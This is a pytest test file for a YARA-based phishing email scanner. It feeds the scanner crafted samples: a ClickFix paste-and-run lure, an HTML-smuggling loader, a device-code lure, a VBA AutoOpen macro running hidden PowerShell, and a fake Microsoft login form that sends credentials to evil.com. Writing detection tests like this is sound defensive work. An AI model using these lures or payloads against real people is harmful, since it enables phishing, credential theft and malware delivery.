"""
tests/test_scanner.py
Unit tests for the YARA scanner (Pipeline Stage C).

Tests YARA rule matching against crafted payloads.
Requires: yara-python (pip install yara-python)
"""
from __future__ import annotations

import pytest

# Skip all tests if yara-python is not installed
yara = pytest.importorskip("yara", reason="yara-python not installed")

from lure.modules.scanner import scan_email, _compile_rules, _RULES_DIR


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture(autouse=True)
def reset_compiled_rules():
    """Reset compiled rules cache between tests."""
    import lure.modules.scanner as scanner_mod
    scanner_mod._compiled_rules = None
    yield
    scanner_mod._compiled_rules = None


def _make_part(content: str | bytes, content_type: str = "text/plain",
               filename: str | None = None) -> dict:
    """Create a MIME part dict for testing."""
    if isinstance(content, str):
        content = content.encode("utf-8")
    return {
        "filename": filename,
        "content_type": content_type,
        "payload": content,
        "is_attachment": filename is not None,
    }


# =============================================================================
# Rule compilation
# =============================================================================

class TestRuleCompilation:

    def test_rules_directory_exists(self):
        assert _RULES_DIR.exists(), f"Rules directory not found: {_RULES_DIR}"

    def test_custom_rules_compile(self):
        rules = _compile_rules()
        assert rules is not None, "No YARA rules compiled"

    def test_phishing_custom_yar_exists(self):
        yar_file = _RULES_DIR / "phishing_custom.yar"
        assert yar_file.exists(), "phishing_custom.yar not found"


# =============================================================================
# ClickFix detection
# =============================================================================

class TestClickFixDetection:

    def test_clickfix_lure_detected(self):
        """ClickFix lure with Win+R + Ctrl+V + verification language."""
        body = """
        To verify you are human, please follow these steps:
        1. Press Win+R to open the Run dialog
        2. Press Ctrl+V to paste the verification code
        3. Press Enter to complete verification
        """
        parts = [_make_part(body)]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_clickfix_clipboard_lure" in rules_matched

    def test_clean_email_not_flagged_as_clickfix(self):
        body = "Hello, here is your monthly newsletter. Please visit our website."
        parts = [_make_part(body)]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_clickfix_clipboard_lure" not in rules_matched


# =============================================================================
# HTML smuggling detection
# =============================================================================

class TestHtmlSmugglingDetection:

    def test_html_smuggling_loader_detected(self):
        """HTML with atob() + Blob + createObjectURL pattern."""
        html = """
        <html><body>
        <script>
            var data = atob('aGVsbG8=');
            var blob = new Blob([data], {type: 'text/html'});
            var url = URL.createObjectURL(blob);
            window.location.assign(url);
        </script>
        </body></html>
        """
        parts = [_make_part(html, content_type="text/html")]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_html_smuggling_loader" in rules_matched


# =============================================================================
# Device code lure detection
# =============================================================================

class TestDeviceCodeDetection:

    def test_device_code_lure_detected(self):
        """Storm-2372 style device code phishing lure."""
        body = """
        You have been invited to a Teams meeting.
        To verify your identity and join the meeting, please:

        1. Go to microsoft.com/devicelogin
        2. Enter the code: ABCD1234
        3. Sign in with your corporate credentials

        This is required for multi-factor authentication compliance.
        """
        parts = [_make_part(body)]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_device_code_lure" in rules_matched


# =============================================================================
# VBA macro detection
# =============================================================================

class TestVbaMacroDetection:

    def test_vba_downloader_detected(self):
        """VBA macro with AutoOpen + Shell + PowerShell."""
        vba = """
        Sub AutoOpen()
            Dim ws As Object
            Set ws = CreateObject("WScript.Shell")
            ws.Run "PowerShell -NoP -NonI -W Hidden -Exec Bypass -Command " & cmd
        End Sub
        """
        parts = [_make_part(vba, filename="evil.doc")]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_vba_macro_downloader" in rules_matched


# =============================================================================
# Credential harvest detection
# =============================================================================

class TestCredentialHarvestDetection:

    def test_credential_harvest_form_detected(self):
        """HTML form with password field + external action + brand name."""
        html = """
        <html><head><title>Microsoft Login</title></head>
        <body>
            <h1>Sign in to Microsoft</h1>
            <form action="https://evil.com/steal">
                <input type="text" name="email">
                <input type="password" name="password">
                <button>Sign in</button>
            </form>
        </body></html>
        """
        parts = [_make_part(html, content_type="text/html")]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_credential_harvest_form" in rules_matched


# =============================================================================
# Base64 URL detection
# =============================================================================

class TestBase64UrlDetection:

    def test_base64_encoded_url_detected(self):
        """Email body containing base64-encoded https URL."""
        # "aHR0cHM6Ly" is the base64 prefix of "https://"
        body = "Click here: aHR0cHM6Ly9ldmlsLmNvbS9waGlzaA=="
        parts = [_make_part(body)]
        result = scan_email(parts)
        rules_matched = [m.rule_name for m in result.matches]
        assert "phishops_base64_encoded_url" in rules_matched


# =============================================================================
# Scanner infrastructure
# =============================================================================

class TestScannerInfrastructure:

    def test_empty_parts_returns_empty_matchset(self):
        result = scan_email([])
        assert result.total_matches == 0
        assert result.matches == []

    def test_empty_payload_skipped(self):
        parts = [_make_part(b"", content_type="text/plain")]
        result = scan_email(parts)
        assert result.total_matches == 0

    def test_scan_target_label_for_body(self):
        body = "aHR0cHM6Ly9ldmlsLmNvbS9waGlzaA=="
        parts = [_make_part(body)]
        result = scan_email(parts)
        if result.matches:
            assert result.matches[0].scan_target.startswith("body_")

    def test_scan_target_label_for_attachment(self):
        vba = "Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub\nPowerShell"
        parts = [_make_part(vba, filename="macro.doc")]
        result = scan_email(parts)
        if result.matches:
            assert result.matches[0].scan_target.startswith("attachment:")

    def test_match_has_metadata(self):
        """Verify that matched rules include meta fields."""
        body = "aHR0cHM6Ly9ldmlsLmNvbS9waGlzaA=="
        parts = [_make_part(body)]
        result = scan_email(parts)
        if result.matches:
            m = result.matches[0]
            assert m.rule_name  # Not empty
            assert m.ruleset  # Has namespace
